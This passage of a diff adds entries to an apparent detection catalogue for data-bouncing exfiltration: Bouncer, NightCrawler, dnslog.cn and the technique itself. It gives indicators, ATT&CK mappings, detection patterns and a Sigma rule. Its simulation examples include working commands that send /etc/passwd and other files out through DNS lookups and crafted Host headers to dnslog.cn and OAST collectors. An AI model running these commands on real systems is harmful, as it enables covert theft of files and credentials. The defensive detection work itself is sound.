+        "pattern": "HTTP requests with X-Forwarded-For or Referer headers containing hex-encoded subdomains under OAST domains",
+        "detect_type": "exfil_action",
+        "purpose": "Bouncer rotates data chunks across Host, X-Forwarded-For, and Referer header positions — encoded subdomains in these headers indicate active data bouncing",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "DNS queries with sequential hex-encoded subdomain labels (e.g. 0001.hexdata.exfil.domain, 0002.hexdata.exfil.domain)",
+        "detect_type": "exfil_action",
+        "purpose": "Sequence-numbered DNS queries from trusted servers resolving Bouncer's crafted hostnames — each query carries one chunk of the exfiltrated file",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      }
+    ],
+    "signer": [
+      "not signed"
+    ],
+    "ioc_artifacts": {
+      "user_agents": [
+        "python-requests/*"
+      ],
+      "named_pipes": [],
+      "service_names": [],
+      "scheduled_tasks": [],
+      "destination_ports": [
+        80,
+        443
+      ],
+      "mutexes": []
+    },
+    "related_protocol": "DNS Data Bouncing / Indirect Exfiltration"
+  },
+  {
+    "name": "NightCrawler (Unit-259 / Jakoby PowerShell)",
+    "category": "Data Bouncing",
+    "platform": "Windows",
+    "overview": "PowerShell-based data bouncing exfiltration toolkit by Jakoby (Unit-259). NightCrawler hex-encodes files into DNS subdomain chunks with sequence numbers, sends each chunk as part of an HTTP header to trusted domains, and supports AES encryption and multi-URL distribution — chunks are spread across multiple trusted endpoints (e.g. adobe.com, github.com) making interception from any single intermediary impossible. Includes a GUI mode and ships with Invoke-DeadPool for reassembly and decryption on the attacker side. Built on the original data bouncing concept by TheContractor (John) and DeathsPirate (Dave).",
+    "telemetry_overview": [
+      "PowerShell script block logging (Event ID 4104)",
+      "Process creation logs (powershell.exe / pwsh.exe)",
+      "Proxy / firewall HTTP logs",
+      "DNS query logs for hex-encoded subdomain patterns"
+    ],
+    "detailed_artifacts": [
+      {
+        "source": "Windows Event Log",
+        "path": "Microsoft-Windows-PowerShell/Operational — Event ID 4104 (Script Block Logging)",
+        "notes": "PowerShell script block logging captures the full Invoke-NightCrawler command including the -Domain, -Urls, -FilePath, and -EncryptionKey parameters. This is the highest-fidelity artifact for this tool."
+      },
+      {
+        "source": "Windows Event Log",
+        "path": "Microsoft-Windows-PowerShell/Operational — Event ID 4103 (Module Logging)",
+        "notes": "Module logging may capture the NightCrawler function loading and parameter binding."
+      },
+      {
+        "source": "Endpoint",
+        "path": "Invoke-NightCrawler.ps1 / Invoke-DeadPool.ps1 on disk",
+        "notes": "Presence of these PowerShell scripts indicates data bouncing capability. Check Downloads, Temp, and user profile directories."
+      },
+      {
+        "source": "Endpoint",
+        "path": "PowerShell console history — %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
+        "notes": "PSReadLine history may contain Invoke-NightCrawler and Invoke-DeadPool commands with full parameters including exfil domain and encryption key."
+      },
+      {
+        "source": "Filesystem",
+        "path": "Interactsh / DNS log JSON files used by Invoke-DeadPool for reassembly",
+        "notes": "JSON files from the DNS listener stored locally for reassembly — contains captured interaction data with hex-encoded chunks."
+      },
+      {
+        "source": "Network",
+        "path": "HTTP requests to multiple trusted domains with crafted headers containing hex-encoded subdomains",
+        "notes": "NightCrawler distributes chunks across multiple URLs — proxy logs will show rapid outbound HTTP to diverse legitimate domains (adobe.com, github.com, etc.) from a single host."
+      },
+      {
+        "source": "DFIR",
+        "path": "DNS resolver cache / passive DNS",
+        "notes": "Queries triggered by trusted servers resolving NightCrawler's hex-encoded hostnames. Format: sequencenum.hexchunk.identifier.oast.domain — decodable to recover exfiltrated content."
+      }
+    ],
+    "network_indicators": [
+      "Burst of HTTP requests from a single Windows host to multiple diverse trusted domains in a short window",
+      "HTTP requests where the Host header contains hex-encoded strings under an OAST domain while the connection goes to a trusted domain",
+      "DNS queries with hex-encoded subdomain labels containing sequential numbering from trusted servers",
+      "PowerShell Invoke-WebRequest or Invoke-RestMethod traffic to diverse high-reputation domains with anomalous headers"
+    ],
+    "staging_behaviors": [
+      "Target file read into memory and optionally AES-encrypted with user-supplied key",
+      "Encrypted payload hex-encoded and split into DNS-label-safe chunks with sequence numbers",
+      "Multiple trusted domain URLs loaded as comma-separated list for chunk distribution",
+      "Each chunk randomly assigned to one of the provided trusted URLs before the send loop"
+    ],
+    "expected_child_processes": [
+      "powershell.exe / pwsh.exe (running Invoke-NightCrawler or Invoke-DeadPool)",
+      "conhost.exe (console host for PowerShell GUI mode)",
+      "Invoke-WebRequest / Invoke-RestMethod (underlying HTTP engine for sending crafted requests)"
+    ],
+    "attack_mappings": [
+      {
+        "id": "T1048.001",
+        "name": "Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol",
+        "why": "NightCrawler AES-encrypts and hex-encodes the file, then exfiltrates via DNS lookups triggered by HTTP requests to trusted domains — data never travels over a direct C2 channel."
+      },
+      {
+        "id": "T1071.001",
+        "name": "Application Layer Protocol: Web Protocols",
+        "why": "The first leg of exfiltration is standard HTTP/HTTPS to legitimate trusted domains (adobe.com, github.com, etc.) — the exfil payload is hidden in HTTP headers."
+      },
+      {
+        "id": "T1071.004",
+        "name": "Application Layer Protocol: DNS",
+        "why": "The actual data transport occurs when trusted servers perform DNS lookups on the hex-encoded hostnames — each lookup delivers a chunk to the attacker's DNS listener."
+      },
+      {
+        "id": "T1059.001",
+        "name": "Command and Scripting Interpreter: PowerShell",
+        "why": "NightCrawler is a PowerShell script that uses native PowerShell cmdlets (Invoke-WebRequest) for the exfiltration — living off the land with built-in Windows scripting."
+      },
+      {
+        "id": "T1001.003",
+        "name": "Data Obfuscation: Protocol Impersonation",
+        "why": "Outbound traffic appears as legitimate HTTP to trusted domains; the exfil data is obfuscated as hex-encoded hostnames in standard HTTP headers."
+      },
+      {
+        "id": "T1090.002",
+        "name": "Proxy: External Proxy",
+        "why": "Trusted web servers act as unwitting proxies (confused deputy / CWE-441) — they process the HTTP request and trigger DNS resolution that delivers data to the attacker."
+      }
+    ],
+    "refs": [
+      {
+        "label": "Unit-259 / Jakoby: DataBouncing PowerShell GitHub repository — NightCrawler and DeadPool scripts",
+        "url": "https://github.com/Unit-259/DataBouncing",
+        "type": "github"
+      },
+      {
+        "label": "DataBouncing.io: Data Bouncing With Jakoby — PowerShell version using hex encoding and public Interactsh",
+        "url": "https://databouncing.io/tag/guides/",
+        "type": "report"
+      },
+      {
+        "label": "DataBouncing.io: Principle — core concept of indirect exfiltration via trusted hostname lookups",
+        "url": "https://databouncing.io/principle/",
+        "type": "report"
+      },
+      {
+        "label": "TheContractor.io: Data Bouncing — original concept by John and Dave, references Jakoby's PowerShell implementation",
+        "url": "https://thecontractor.io/data-bouncing/",
+        "type": "report"
+      }
+    ],
+    "simulation_examples": [
+      {
+        "description": "Exfiltrate a file via NightCrawler with AES encryption distributed across multiple trusted domains",
+        "command": "# Load the NightCrawler module\nImport-Module .\\Invoke-NightCrawler.ps1\n# Exfiltrate with encryption across multiple trusted URLs\nInvoke-NightCrawler -Identifier \"testid\" -Domain \"YOUR_OOB.oast.fun\" -Urls \"adobe.com\",\"github.com\" -FilePath \"C:\\Sensitive\\secret.docx\" -EncryptionEnabled -EncryptionKey \"YourSecretKey\""
+      },
+      {
+        "description": "Reassemble exfiltrated file on attacker side using DeadPool",
+        "command": "# On attacker machine with captured DNS logs\nImport-Module .\\Invoke-DeadPool.ps1\nInvoke-DeadPool -LogFile \"C:\\Logs\\interactsh_output.txt\" -Identifier \"testid\" -EncryptionEnabled -EncryptionKey \"YourSecretKey\" -OutputFile \"C:\\Recovered\\secret.docx\""
+      },
+      {
+        "description": "Use NightCrawler GUI mode for interactive exfiltration",
+        "command": "Import-Module .\\Invoke-NightCrawler.ps1\n# Launch GUI — supports comma-separated URLs and encryption toggle\nInvoke-NightCrawler -GUI"
+      }
+    ],
+    "endpoint_detection_patterns": [
+      {
+        "pattern": "*Invoke-NightCrawler*",
+        "detect_type": "exfil_action",
+        "purpose": "NightCrawler PowerShell function invocation — primary data bouncing exfiltration command",
+        "detects": {
+          "tool_presence": true,
+          "exfil_action": true
+        },
+        "arguments": [
+          {
+            "argument": "-Domain",
+            "why": "Specifies the attacker-controlled OOB domain (e.g. oast.fun subdomain) where bounced data chunks will be collected via DNS."
+          },
+          {
+            "argument": "-Urls",
+            "why": "Comma-separated list of trusted domains to bounce through — chunks are distributed across these intermediaries."
+          },
+          {
+            "argument": "-FilePath",
+            "why": "Path to the file being exfiltrated."
+          },
+          {
+            "argument": "-EncryptionKey",
+            "why": "AES key used to encrypt the file before chunking — presence confirms intentional covert exfiltration."
+          }
+        ]
+      },
+      {
+        "pattern": "*Invoke-DeadPool*",
+        "detect_type": "tool_execution",
+        "purpose": "DeadPool PowerShell function — reassembles and decrypts exfiltrated file from DNS logs on attacker side",
+        "detects": {
+          "tool_presence": true,
+          "exfil_action": false
+        },
+        "arguments": [
+          {
+            "argument": "-LogFile",
+            "why": "DNS log file containing captured hex-encoded chunks from the data bouncing operation."
+          },
+          {
+            "argument": "-OutputFile",
+            "why": "Destination path for the reassembled exfiltrated file."
+          }
+        ]
+      },
+      {
+        "pattern": "*NightCrawler*.ps1*",
+        "detect_type": "tool_execution",
+        "purpose": "NightCrawler PowerShell script file on disk or being loaded via Import-Module",
+        "detects": {
+          "tool_presence": true,
+          "exfil_action": false
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "*DeadPool*.ps1*",
+        "detect_type": "tool_execution",
+        "purpose": "DeadPool PowerShell script file on disk — attacker-side reassembly tool",
+        "detects": {
+          "tool_presence": true,
+          "exfil_action": false
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "powershell*Invoke-WebRequest*-Headers*Host*oast.*",
+        "detect_type": "exfil_action",
+        "purpose": "PowerShell sending HTTP request with crafted Host header containing OAST domain — active data bouncing",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "Event ID 4104 containing 'NightCrawler' or 'DataBouncing' or 'Invoke-DeadPool'",
+        "detect_type": "exfil_action",
+        "purpose": "PowerShell Script Block Logging capturing NightCrawler execution — highest-fidelity detection for this tool on Windows",
+        "detects": {
+          "tool_presence": true,
+          "exfil_action": true
+        },
+        "arguments": []
+      }
+    ],
+    "network_detection_patterns": [
+      {
+        "pattern": "Burst of HTTP requests from single Windows host to multiple diverse trusted domains (adobe.com, github.com, etc.) in short window",
+        "detect_type": "bulk_transfer_or_staging",
+        "purpose": "NightCrawler's multi-URL distribution spreads chunks across many trusted intermediaries — a single host rapidly hitting diverse legitimate domains is the signature pattern",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "HTTP request where Host header contains hex-encoded strings under OAST domain while connection goes to trusted domain",
+        "detect_type": "exfil_action",
+        "purpose": "Core data bouncing indicator — deep HTTP inspection reveals the Host header mismatch carrying exfil data",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "DNS queries with sequential hex-encoded subdomain labels from trusted servers resolving to OAST infrastructure",
+        "detect_type": "exfil_action",
+        "purpose": "Trusted servers resolving NightCrawler's crafted hostnames — sequential hex subdomains are characteristic of chunked file exfiltration",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "PowerShell User-Agent string in HTTP requests to diverse trusted domains",
+        "detect_type": "tool_execution",
+        "purpose": "Invoke-WebRequest sends a default PowerShell User-Agent — unusual to see this hitting many diverse trusted domains in sequence",
+        "detects": {
+          "tool_presence": true,
+          "exfil_action": false
+        },
+        "arguments": []
+      }
+    ],
+    "signer": [
+      "not signed"
+    ],
+    "ioc_artifacts": {
+      "user_agents": [
+        "Mozilla/5.0 (Windows NT; Windows NT *; *) WindowsPowerShell/*"
+      ],
+      "named_pipes": [],
+      "service_names": [],
+      "scheduled_tasks": [],
+      "destination_ports": [
+        80,
+        443
+      ],
+      "mutexes": []
+    },
+    "related_protocol": "DNS Data Bouncing / Indirect Exfiltration"
+  },
+  {
+    "name": "dnslog.cn (web-based DNS callback collector)",
+    "category": "Data Bouncing",
+    "platform": "Any",
+    "overview": "Web-based DNS logging platform that provides temporary subdomains for capturing DNS callbacks. Serves the same exfiltration collector role as Interactsh or Burp Collaborator — an attacker registers a subdomain via the web interface, then data-laden DNS queries arrive from bouncing through trusted intermediaries and are logged for retrieval. No installation required, entirely browser-based. Widely observed in real threat campaigns — particularly from Chinese-origin threat actors and mass vulnerability scanning operations. Listed in standard SIEM detection rulesets alongside Interactsh and Burp Collaborator OAST domains.",
+    "telemetry_overview": [
+      "DNS query logs (passive DNS / resolver logs)",
+      "Proxy / firewall HTTP logs for access to dnslog.cn web interface",
+      "SIEM correlation rules for dnslog.cn subdomains",
+      "Browser history / forensic artifacts showing dnslog.cn access"
+    ],
+    "detailed_artifacts": [
+      {
+        "source": "Network",
+        "path": "DNS queries to *.dnslog.cn",
+        "notes": "Any internal host or trusted intermediary resolving subdomains under dnslog.cn is delivering data to a DNS callback collector. Subdomain labels may contain encoded exfil data chunks."
+      },
+      {
+        "source": "Network",
+        "path": "HTTP/HTTPS connections to dnslog.cn on ports 80/443",
+        "notes": "Access to the dnslog.cn web interface — the operator registers a temporary subdomain and polls for captured DNS interactions. This is the management plane."
+      },
+      {
+        "source": "Endpoint",
+        "path": "Browser history / cache containing dnslog.cn URLs",
+        "notes": "Browser forensic artifacts confirming an operator visited dnslog.cn to register a listener subdomain and retrieve captured callbacks."
+      },
+      {
+        "source": "Endpoint",
+        "path": "Scripts or command history referencing dnslog.cn subdomains",
+        "notes": "Look for curl, wget, Invoke-WebRequest, nslookup, or dig commands containing dnslog.cn subdomains — indicates active exfil setup or data bouncing."
+      },
+      {
+        "source": "DFIR",
+        "path": "DNS resolver cache / passive DNS telemetry",
+        "notes": "Historical queries to dnslog.cn subdomains reveal the timeline and volume of data bouncing or OOB exfiltration activity. Subdomain strings may be decodable."
+      }
+    ],
+    "network_indicators": [
+      "DNS queries to *.dnslog.cn subdomains from internal hosts or from trusted intermediary servers",
+      "High volume of DNS queries with long, hex- or base64-encoded subdomain labels under dnslog.cn",
+      "HTTP requests to diverse trusted domains with Host / X-Forwarded-For / Referer headers containing dnslog.cn subdomains",
+      "HTTP access to dnslog.cn web interface from internal hosts (operator registering listener)"
+    ],
+    "staging_behaviors": [
+      "File chunked and encoded (hex or base64) into DNS-label-safe subdomains before transmission",
+      "Temporary dnslog.cn subdomain registered via web interface before exfil begins",
+      "Encryption applied to chunks before encoding into subdomain labels",
+      "Sequence numbering prepended to chunks for manual reassembly from the dnslog.cn web log"
+    ],
+    "expected_child_processes": [
+      "Browser process (Chrome, Firefox, Edge — accessing dnslog.cn web interface)",
+      "curl / wget / Invoke-WebRequest (sending crafted HTTP requests with dnslog.cn subdomains in headers)",
+      "nslookup / dig / Resolve-DnsName (direct DNS exfil to dnslog.cn subdomain)",
+      "python3 / powershell / bash (running sender scripts targeting dnslog.cn as the collector)"
+    ],
+    "attack_mappings": [
+      {
+        "id": "T1048.001",
+        "name": "Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol",
+        "why": "Data is encoded into DNS subdomains under dnslog.cn and exfiltrated via DNS lookups — either directly or triggered by trusted third-party servers through data bouncing."
+      },
+      {
+        "id": "T1071.004",
+        "name": "Application Layer Protocol: DNS",
+        "why": "The actual data transport occurs via DNS queries to dnslog.cn subdomains — each query carries a chunk of the exfiltrated data."
+      },
+      {
+        "id": "T1001.003",
+        "name": "Data Obfuscation: Protocol Impersonation",
+        "why": "When used for data bouncing, outbound traffic appears as legitimate HTTP to trusted domains; the exfil payload is hidden in HTTP headers that trigger DNS lookups to dnslog.cn."
+      },
+      {
+        "id": "T1090.002",
+        "name": "Proxy: External Proxy",
+        "why": "In a data bouncing scenario, trusted web servers act as unwitting proxies — they receive the HTTP request and relay the exfil data via DNS lookup to the attacker's dnslog.cn subdomain."
+      }
+    ],
+    "refs": [
+      {
+        "label": "SocInvestigation: OAST Detection and Response — SIEM queries including dnslog.cn alongside Interactsh and Burp Collaborator",
+        "url": "https://www.socinvestigation.com/out-of-band-application-security-testing-detection-and-response/",
+        "type": "report"
+      },
+      {
+        "label": "GreyNoise Labs: Weekly OAST Report — dnslog.cn listed alongside Interactsh providers in scanning campaigns",
+        "url": "https://www.labs.greynoise.io/grimoire/2026-01-24-weekly-oast-report/",
+        "type": "report"
+      },
+      {
+        "label": "DataBouncing.io: Principle — core concept of indirect exfiltration via trusted hostname lookups applicable to any DNS callback collector",
+        "url": "https://databouncing.io/principle/",
+        "type": "report"
+      }
+    ],
+    "simulation_examples": [
+      {
+        "description": "Register a dnslog.cn subdomain and exfiltrate /etc/passwd via direct DNS queries",
+        "command": "# Visit http://dnslog.cn and click 'Get SubDomain' to get e.g. abc123.dnslog.cn\n# On victim: exfiltrate line by line via DNS\nfor chunk in $(cat /etc/passwd | base64 -w0 | fold -w 40); do\n  nslookup ${chunk}.abc123.dnslog.cn\ndone\n# Check dnslog.cn web interface to see captured queries"
+      },
+      {
+        "description": "Bounce data through trusted domain Host headers to dnslog.cn collector",
+        "command": "# Register subdomain at dnslog.cn\n# Bounce through trusted domains\nfor chunk in $(cat secret.txt | xxd -p | fold -w 40); do\n  curl -s -o /dev/null -H \"Host: ${chunk}.abc123.dnslog.cn\" https://trusted-domain.com\ndone"
+      }
+    ],
+    "endpoint_detection_patterns": [
+      {
+        "pattern": "*dnslog.cn*",
+        "detect_type": "exfil_action",
+        "purpose": "Reference to dnslog.cn in command line, script, config, or browser history — indicates OOB DNS callback collection setup for exfiltration",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "nslookup*dnslog.cn*",
+        "detect_type": "exfil_action",
+        "purpose": "Direct DNS lookup to dnslog.cn subdomain — data exfiltration via DNS queries where subdomain labels carry encoded data",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "dig*dnslog.cn*",
+        "detect_type": "exfil_action",
+        "purpose": "DNS query via dig to dnslog.cn subdomain — same exfil mechanism as nslookup variant",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "*Resolve-DnsName*dnslog.cn*",
+        "detect_type": "exfil_action",
+        "purpose": "PowerShell DNS resolution to dnslog.cn subdomain — Windows-native DNS exfil to dnslog.cn collector",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "curl*-H*Host:*dnslog.cn*",
+        "detect_type": "exfil_action",
+        "purpose": "curl with crafted Host header pointing to dnslog.cn — active data bouncing send through trusted intermediary",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": [
+          {
+            "argument": "-H Host:",
+            "why": "Overriding the Host header to inject a dnslog.cn subdomain containing exfil data — the trusted destination server may perform a DNS lookup, bouncing the data to the dnslog.cn collector."
+          }
+        ]
+      }
+    ],
+    "network_detection_patterns": [
+      {
+        "pattern": "DNS query to *.dnslog.cn",
+        "detect_type": "exfil_action",
+        "purpose": "Any DNS resolution of a dnslog.cn subdomain indicates OOB data exfiltration — the subdomain label likely contains encoded data",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "HTTP/HTTPS connection to dnslog.cn on port 80/443",
+        "detect_type": "tool_execution",
+        "purpose": "Access to dnslog.cn web interface — operator registering a listener subdomain or polling for captured DNS callbacks",
+        "detects": {
+          "tool_presence": true,
+          "exfil_action": false
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "HTTP to trusted domains with Host header containing dnslog.cn subdomains",
+        "detect_type": "exfil_action",
+        "purpose": "Data bouncing in action — legitimate HTTP request carries exfil payload in the Host header; trusted server performs DNS lookup that delivers data to dnslog.cn",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "High volume of DNS queries with long encoded subdomain labels to dnslog.cn from a single source",
+        "detect_type": "bulk_transfer_or_staging",
+        "purpose": "Burst of DNS queries with encoded subdomains indicates chunked file exfiltration — each query carries one chunk of the exfiltrated data",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      }
+    ],
+    "signer": [
+      "not signed"
+    ],
+    "ioc_artifacts": {
+      "user_agents": [],
+      "named_pipes": [],
+      "service_names": [],
+      "scheduled_tasks": [],
+      "destination_ports": [
+        53,
+        80,
+        443
+      ],
+      "mutexes": []
+    },
+    "related_protocol": "DNS Data Bouncing / Indirect Exfiltration"
+  },
+  {
+    "name": "DNS Data Bouncing / Indirect Exfiltration",
+    "category": "Protocol",
+    "platform": "Any",
+    "overview": "Data bouncing is an indirect exfiltration method that abuses trusted third-party web servers as unwitting DNS relay proxies. Unlike traditional DNS exfiltration — where the victim host directly queries an attacker-controlled authoritative nameserver — data bouncing inserts exfil data into HTTP headers (Host, X-Forwarded-For, Referer) of requests sent to legitimate, high-reputation domains. When those trusted servers process the request, their infrastructure performs a DNS lookup on the attacker-crafted hostname embedded in the header. This lookup delivers the data to the attacker's DNS listener. The victim network only sees outbound HTTP to trusted destinations (google.com, adobe.com, github.com) — the exfiltration happens as a second-order DNS query initiated by the trusted server, entirely outside the victim's network perimeter.\n\nHOW DATA BOUNCING WORKS:\n  Victim  ──HTTP──▶  Trusted Domain (google.com)\n                      │\n                      ├─ processes Host header: chunk01.exfil.attacker.com\n                      ├─ CDN / analytics / logging triggers DNS lookup\n                      │\n                      └──DNS──▶  Attacker's DNS Listener (Interactsh / Collaborator)\n                                  └─ captures subdomain = exfil data chunk\n\nWHY IT DEFEATS TRADITIONAL DEFENSES:\n  • Domain-level blocking is useless — destinations are trusted, business-critical domains\n  • DNS monitoring at the victim network sees nothing — the DNS query is made by the trusted server\n  • DLP / proxy inspection sees legitimate HTTP to legitimate domains\n  • Protocol morphing: TCP HTTP → UDP DNS — the exfil changes protocol mid-flight\n  • No direct connection between victim and attacker infrastructure\n  • Related to CWE-441: Unintended Proxy or Intermediary ('Confused Deputy')\n\nDATA ENCODING IN DNS LABELS:\n  • Each DNS label: max 63 characters, FQDN max 253 characters\n  • Typical encoding: hex or base64url of encrypted file chunks\n  • Format: seqnum.hexchunk.identifier.exfil.attacker.com\n  • Usable bandwidth: ~30-60 bytes of raw data per HTTP request/bounce\n  • File chunking: 1KB file ≈ 17-34 bounced requests\n\nDATA BOUNCING VARIANTS:\n  1. Host header bouncing — primary method, most reliable for triggering lookups\n  2. X-Forwarded-For header — analytics and CDN systems resolve these\n  3. Referer header — many services log and resolve referer domains\n  4. Link preview bouncing — messaging platforms fetch and resolve URLs\n  5. Email address bouncing — MX lookups on crafted email domains\n\nATTACKER REQUIREMENTS:\n  • DNS listener: Interactsh (public or self-hosted), Burp Collaborator, dnslog.cn, ceye.io, or custom NS\n  • List of bounce-capable trusted domains (identified via Recruiter scripts)\n  • Sender script: Bouncer (Python), NightCrawler (PowerShell), or custom curl/wget loop\n  • Reassembly tool: Therapist (Python), DeadPool (PowerShell), or custom DNS log parser\n\nTHROUGHPUT:\n  • Dependent on: chunk size per bounce, delay between requests, number of trusted intermediaries\n  • Typical: 30-60 bytes per bounce × 5-10 bounces/sec = 150-600 bytes/sec\n  • With multi-URL distribution (NightCrawler): chunks spread across N domains, harder to detect but same aggregate throughput\n  • Sufficient for documents, credentials, keys — not designed for bulk database exfil\n\nKEY DIFFERENCE FROM TRADITIONAL DNS EXFIL:\n  Traditional DNS exfil: victim → DNS resolver → attacker NS (visible in victim's DNS logs)\n  Data bouncing: victim → trusted HTTP server → trusted server's DNS → attacker NS (invisible in victim's DNS logs)\n  The critical distinction is that the DNS query carrying the data originates from the trusted server, NOT from the victim network.",
+    "telemetry_overview": [
+      "Proxy / firewall HTTP logs — Host header vs destination IP mismatch",
+      "Deep HTTP inspection — headers containing encoded subdomains under uncommon TLDs",
+      "DNS query logs at trusted server side — hex/base64 encoded subdomain patterns (often unavailable to victim org)",
+      "NDR / NTA platforms — anomalous burst HTTP patterns to diverse trusted domains from single host",
+      "TLS inspection for SNI mismatch with Host header content",
+      "EDR process telemetry — which process is generating HTTP to diverse trusted domains"
+    ],
+    "detailed_artifacts": [
+      {
+        "source": "Network — Proxy / NGFW",
+        "path": "HTTP request logs with full header capture",
+        "notes": "The primary detection surface. Look for:\n• Host header value that does NOT match the destination domain\n• Host header containing hex/base64-encoded strings (e.g. 4a6f686e.0001.abc123.oast.fun)\n• X-Forwarded-For or Referer headers containing subdomains under OAST domains (oast.*, oastify.com, dnslog.cn)\n• Single source IP hitting many diverse trusted domains in rapid succession\n\nSplunk query:\nindex=proxy sourcetype=squid OR sourcetype=bluecoat\n| eval host_header=coalesce(cs_host, http_host)\n| eval dest_domain=coalesce(dest_host, dest_ip)\n| where host_header!=dest_domain\n| regex host_header=\"[a-f0-9]{20,}|[A-Za-z0-9+/]{20,}\"\n| stats count by src_ip, dest_domain, host_header"
+      },
+      {
+        "source": "Network — TLS Inspection",
+        "path": "TLS SNI field vs HTTP Host header comparison",
+        "notes": "When TLS inspection is deployed, compare:\n• TLS Client Hello SNI = trusted-domain.com (legitimate)\n• Decrypted HTTP Host header = hexdata.exfil.oast.fun (exfil)\nThis mismatch is the canonical data bouncing fingerprint.\nNote: Without TLS inspection, only the SNI is visible and looks entirely legitimate."
+      },
+      {
+        "source": "Network — NDR / NTA",
+        "path": "Traffic pattern analysis — burst HTTP to diverse destinations",
+        "notes": "Behavioral detection (no content inspection required):\n• Single host → 50+ unique trusted domains in < 5 minutes\n• Each request is small (GET or HEAD), minimal response body\n• Requests are sequential with consistent inter-request timing (~200ms)\n• Destination domains are all high-reputation (Alexa/Tranco top 10K)\nThis pattern is anomalous for any normal user or application."
+      },
+      {
+        "source": "Network — DNS (limited visibility)",
+        "path": "Victim-side DNS resolver logs",
+        "notes": "IMPORTANT: In a data bouncing attack, the victim's DNS logs will NOT show the exfil queries.\nThe DNS queries are made by the trusted server, not the victim.\nVictim DNS logs will only show:\n• A record lookups for the trusted domains (google.com, adobe.com, etc.) — entirely normal\n• NO queries to oast.*, oastify.com, or attacker domains\nThis is what makes data bouncing fundamentally harder to detect than traditional DNS exfil."
+      },
+      {
+        "source": "Endpoint — Process Telemetry",
+        "path": "EDR: process + network connection correlation",
+        "notes": "Key endpoint indicators:\n• curl, wget, python3, powershell making HTTP to diverse trusted domains with custom headers\n• Invoke-WebRequest or Invoke-RestMethod with -Headers parameter containing non-standard values\n• File read followed by encoding activity (base64, hex) followed by HTTP burst\n• PowerShell Event ID 4104 containing 'NightCrawler', 'Bouncer', 'oast.', 'oastify'\n• Python process importing 'requests' and iterating over a domain list file"
+      },
+      {
+        "source": "DFIR — Attacker Infrastructure",
+        "path": "Interactsh / Burp Collaborator / custom DNS server logs",
+        "notes": "On the attacker collection side, each captured DNS query contains:\n• Correlation ID (maps to Interactsh session)\n• Sequence number (chunk ordering)\n• Hex/base64 encoded data chunk\n• Source IP of the trusted server that performed the lookup (NOT the victim)\nForensic recovery: if you can obtain the attacker's DNS logs, chunks can be reassembled and decrypted."
+      },
+      {
+        "source": "Network — Sigma Rule",
+        "path": "Sigma rule for SIEM — Data Bouncing via Host Header Mismatch",
+        "notes": "title: Data Bouncing - HTTP Host Header Mismatch with OAST Domain\nstatus: experimental\nlogsource:\n  category: proxy\ndetection:\n  selection_oast:\n    cs-host|contains:\n      - 'oast.pro'\n      - 'oast.me'\n      - 'oast.live'\n      - 'oast.site'\n      - 'oast.online'\n      - 'oast.fun'\n      - 'oastify.com'\n      - 'burpcollaborator.net'\n      - 'interact.sh'\n      - 'dnslog.cn'\n      - 'ceye.io'\n  selection_mismatch:\n    cs-host|re: '[a-f0-9]{20,}\\.[a-z0-9-]+\\.[a-z]{2,}'\n  filter_matching:\n    cs-host: sc-dst-host\n  condition: (selection_oast OR selection_mismatch) AND NOT filter_matching\nfalsepositives:\n  - Legitimate security scanners using OAST\n  - CDN health checks with custom Host headers\nlevel: high"
+      }
+    ],
+    "network_indicators": [
+      "HTTP Host header value does not match destination domain/IP — the definitive data bouncing signal",
+      "Host / X-Forwarded-For / Referer headers containing hex or base64 encoded strings under OAST domains",
+      "Single host making HTTP requests to 50+ diverse high-reputation domains in under 5 minutes",
+      "Small HTTP requests (GET/HEAD, minimal body) with consistent inter-request timing to varied trusted domains",
+      "Absence of suspicious DNS queries in victim network logs despite confirmed exfiltration — the 'invisible DNS' gap",
+      "Known OAST collector domains in any HTTP header: oast.*, oastify.com, burpcollaborator.net, interact.sh, dnslog.cn, ceye.io"
+    ],
+    "staging_behaviors": [
+      "Target file encrypted (AES/Fernet) and encoded (hex/base64) before chunking",
+      "Chunk size calculated to fit within DNS label limits (63 chars per label, 253 chars total FQDN)",
+      "Bounce target list generated via Recruiter reconnaissance or manually curated from top-N domain lists",
+      "Sender script loaded with: exfil domain, target file, trusted domain list, chunk size, delay parameters",
+      "Interactsh or Collaborator session registered to generate collection subdomain before the send begins"
+    ],
+    "expected_child_processes": [
+      "python3 bouncer.py / recruiter.py / dentist.py / thetherapist.py (N1ckDunn toolkit)",
+      "powershell.exe with Invoke-NightCrawler / Invoke-DeadPool (Unit-259 toolkit)",
+      "curl / wget with custom -H Host: headers in a loop",
+      "interactsh-client / interactsh-server (collection side)",
+      "java -jar burpsuite_pro.jar --collaborator-server (collection side)"
+    ],
+    "attack_mappings": [
+      {
+        "id": "T1048.001",
